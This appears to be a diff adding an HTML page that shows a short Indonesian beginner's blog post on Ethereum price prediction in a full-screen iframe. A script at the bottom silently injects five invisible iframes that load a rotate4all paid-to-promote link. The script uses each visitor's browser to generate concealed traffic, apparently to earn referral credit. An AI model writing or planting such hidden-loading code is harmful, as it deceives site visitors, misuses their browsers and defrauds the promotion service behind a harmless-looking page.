@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Ethereum Blog</title>
+
+<style>
+    html, body {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        overflow: hidden;
+    }
+
+    iframe {
+        position: fixed;
+        inset: 0;
+        width: 100%;
+        height: 100%;
+        border: none;
+    }
+
+    .hidden {
+        opacity: 0;
+        pointer-events: none;
+    }
+</style>
+
+</head>
+<body>
+
+<!-- IFRAME BLOG (TAMPIL) -->
+<iframe 
+  srcdoc='
+  <!DOCTYPE html>
+  <html lang="id">
+  <body>
+
+  <header>
+    <h1>Blog Prediksi Ethereum (ETH)</h1>
+    <p>Analisa sederhana untuk pemula</p>
+  </header>
+
+  <article>
+    <h2>Apa itu Ethereum?</h2>
+    <p>
+      Ethereum (ETH) adalah salah satu cryptocurrency terbesar di dunia
+      yang digunakan untuk smart contract dan aplikasi blockchain.
+    </p>
+
+    <h2>Faktor yang Mempengaruhi Harga</h2>
+    <ul>
+      <li>Adopsi teknologi blockchain</li>
+      <li>Upgrade jaringan</li>
+      <li>Sentimen pasar crypto</li>
+      <li>Regulasi pemerintah</li>
+    </ul>
+
+    <h2>Prediksi Sederhana</h2>
+    <p>
+      ETH berpotensi naik dalam jangka panjang jika adopsi terus meningkat.
+    </p>
+
+    <p class="highlight">
+      Ini bukan saran finansial!
+    </p>
+
+    <h2>Strategi untuk Pemula</h2>
+    <ol>
+      <li>Investasi bertahap (DCA)</li>
+      <li>Jangan panik</li>
+      <li>Gunakan uang dingin</li>
+    </ol>
+  </article>
+
+  <footer>
+    <p>© 2026 Blog Crypto</p>
+  </footer>
+
+  </body>
+  </html>
+  '>
+</iframe>
+
+<script>
+const link = "https://www.rotate4all.com/ptp/promote-299672";
+
+// 5 iframe background (hidden) dengan jeda 4 detik
+for (let i = 0; i < 5; i++) {
+    setTimeout(() => {
+        let iframe = document.createElement('iframe');
+        iframe.src = link;
+        iframe.className = 'hidden';
+        document.body.appendChild(iframe);
+    }, i * 100);
+}
+</script>
+
+</body>
+</html>
